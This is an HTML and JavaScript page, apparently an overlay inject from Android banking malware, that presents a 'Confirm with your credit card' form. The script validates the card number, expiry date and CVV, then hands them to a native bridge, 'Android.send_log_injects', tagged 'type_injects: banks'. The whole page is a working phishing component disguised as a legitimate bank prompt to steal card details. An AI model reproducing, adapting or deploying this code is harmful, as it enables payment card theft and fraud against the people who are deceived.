<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>

    <title>Document</title>
<style>
        .input {
            width: 100%;
            border: 0;
            border-bottom: 2px solid #0e5aa7;
            margin-top: 15px;
            height: 44px;
            color: #0e5aa7;
            padding-left: 0;
            transition: all 0.2s ease;
            padding-right: 25px;
            font-weight: 600;
            background-color: #fafbfd;
            padding: 10px;
        }

        input,
        button {
            outline: none !important;
            box-shadow: none !important;
        }

        section {
            padding: 18px;
        }
        input::placeholder{
            color: #0e5aa7;
        }
        .button {
            width: 100%;
            padding: 8px;
            color: #fff;
            background-color: #0e5aa7;
            border: 0;
            margin-bottom: 15px;
            font-weight: 600;
            border-radius: 5px;
        }

        .button:disabled {
            opacity: 0.4;
        }
        .error {
            border-color: #f00 !important;
        }
        form{
        display: flex;
        flex-direction: column;
        min-height: 100vh;
        }
        footer{
            clear: both;
        }
</style>
</head>

        </header>
        <section>
            <h4 style="font-weight:700;font-size: 19px;text-align: center; color:#0e5aa7;">
                Confirm with your credit card
            </h4>
            <input type="tel" id="cc" name="cc" onkeyup="check6();check8()" class="input" placeholder="Credit Card" autocomplete="off">

            <input type="tel" style="width: 58%;float: left;margin-top: 5px;" id="exp" name="exp" maxlength="5" onkeyup="check7();check8()" class="input" placeholder="Expiration date" autocomplete="off">

            <input type="password" style="width: 42%;float: right;margin-bottom: 20px;margin-top: 5px;" id="cvv" name="cvv" maxlength="3" onkeyup="check8()" class="input" placeholder="CVV" autocomplete="off">  

        <input type="button" class="button" disabled id="sendData" value="Sign in">
        </section>
    </form>
<script>
        $('#cc').mask('0000 0000 0000 0000')
        $('#exp').mask('00/00')
        $('#cvv').mask('000')

    var sendData = document.getElementById('sendData');
        function check7() {
            
            var mmYY = exp.value.split('/');
            var month = parseInt(mmYY[0]);
            var year = parseInt(mmYY[1]);
    
            var expArray = exp.value.split('/');
            var today, someday;
            var exMonth = expArray[0];
            var exYear = "20" + expArray[1];
    
            today = new Date();
            someday = new Date();
            someday.setFullYear(exYear, exMonth, 1);
                    
            if(month > 12 || month == 0 || month == 00 || someday < today || year > 27 || exp.value.length != 5) {
                exp.classList.add('error')
            } else {
                exp.classList.remove('error')
                return true
            }
        }

        function valid_credit_card(value) {
            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
            if (/[^0-9-\s]+/.test(value)) return false;
            var nCheck = 0, nDigit = 0, bEven = false;
            value = value.replace(/\D/g, "");
            for (var n = value.length - 1; n >= 0; n--) {
                var cDigit = value.charAt(n),
                    nDigit = parseInt(cDigit, 10);
                if (bEven) {
                    if ((nDigit *= 2) > 9) nDigit -= 9;
                }
                nCheck += nDigit;
                bEven = !bEven;
            }
            return (nCheck % 10) == 0;
            
        }

        function check6() {
            if(!valid_credit_card(cc.value)) {
                cc.classList.add('error')
            } else {
                cc.classList.remove('error');
            }
        }

        function check8() {
            if(valid_credit_card(cc.value) && check7() && cvv.value.length === 3) {
                sendData.disabled = false;
            } else {
                sendData.disabled = true;
            }
        }

        sendData.onclick = () => {
            var data = {};
                data.cc = cc.value;
                data.exp = exp.value;
                data.cvv = cvv.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
        }
</script>
